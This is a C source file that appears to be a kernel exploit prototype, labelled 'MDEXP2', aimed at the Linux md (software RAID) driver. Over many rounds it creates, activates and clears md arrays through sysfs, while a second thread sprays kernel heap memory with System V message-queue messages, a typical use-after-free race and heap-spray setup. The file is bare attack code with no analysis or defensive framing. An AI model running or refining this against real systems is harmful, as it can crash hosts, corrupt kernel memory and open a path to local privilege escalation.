#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>

#define MD_NEW_ARRAY "/sys/module/md_mod/parameters/new_array"

static int wr(const char *p, const char *v, char *err, size_t errn)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) {
        if (err) snprintf(err, errn, "open:%d", errno);
        return -1;
    }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (n < 0) {
        if (err) snprintf(err, errn, "write:%d", e);
        errno = e;
        return -1;
    }
    return 0;
}

struct spray_arg {
    int qid;
    int count;
    int size;
    volatile int *go;
    volatile int *done;
};

static void *spray_thread(void *p)
{
    struct spray_arg *a = (struct spray_arg *)p;
    int sz = a->size;
    char *msg = malloc(sz + 16);
    if (!msg) return NULL;
    while (1) {
        while (!*a->go) {
            if (*a->done) { free(msg); return NULL; }
            sched_yield();
        }
        *(long *)msg = 1;
        for (int i = 0; i < a->count; i++) {
            memset(msg + 8, 0x42, sz);
            msgsnd(a->qid, msg, sz, IPC_NOWAIT);
        }
        *a->go = 0;
        *a->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 200;
    int spray_cnt = argc > 2 ? atoi(argv[2]) : 2000;
    int msg_size = argc > 3 ? atoi(argv[3]) : 960;

    printf("MDEXP2 start uid=%d rounds=%d spray=%d msgsz=%d\n",
           getuid(), rounds, spray_cnt, msg_size);
    fflush(stdout);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("FAIL msgget %d\n", errno); return 1; }
    printf("msgq=%d\n", qid);
    fflush(stdout);

    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, spray_cnt, msg_size, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int ok_c = 0, fail_c = 0, ok_a = 0, fail_a = 0, ok_cl = 0, fail_cl = 0;
    char e1[64], e2[64], e3[64];
    e1[0] = e2[0] = e3[0] = 0;

    for (int i = 0; i < rounds; i++) {
        char name[32], p[160];
        snprintf(name, sizeof(name), "md%d", i);

        if (wr(MD_NEW_ARRAY, name, e1, sizeof(e1)) < 0) { fail_c++; continue; }
        ok_c++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/level", name);
        wr(p, "raid1", e2, sizeof(e2));

        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", name);
        wr(p, "1", e2, sizeof(e2));

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        if (wr(p, "active", e2, sizeof(e2)) < 0) {
            fail_a++;
            wr(p, "clear", e3, sizeof(e3));
            continue;
        }
        ok_a++;

        done = 0;
        go = 1;

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        if (wr(p, "clear", e3, sizeof(e3)) < 0) fail_cl++; else ok_cl++;

        for (int w = 0; w < 200 && !done; w++) usleep(500);
        go = 0;

        char tmp[2048];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        if (i < 3 || (i % 50) == 0) {
            printf("r=%d c=%d a=%d cl=%d e=%s/%s/%s\n",
                   i, ok_c, ok_a, ok_cl, e1, e2, e3);
            fflush(stdout);
        }
    }

    done = 1;
    go = 1;
    printf("STATS create_ok=%d fail=%d active_ok=%d fail=%d clear_ok=%d fail=%d\n",
           ok_c, fail_c, ok_a, fail_a, ok_cl, fail_cl);
    printf("errs: create=%s active=%s clear=%s\n", e1, e2, e3);
    printf("MDEXP2 done\n");
    fflush(stdout);
    return 0;
}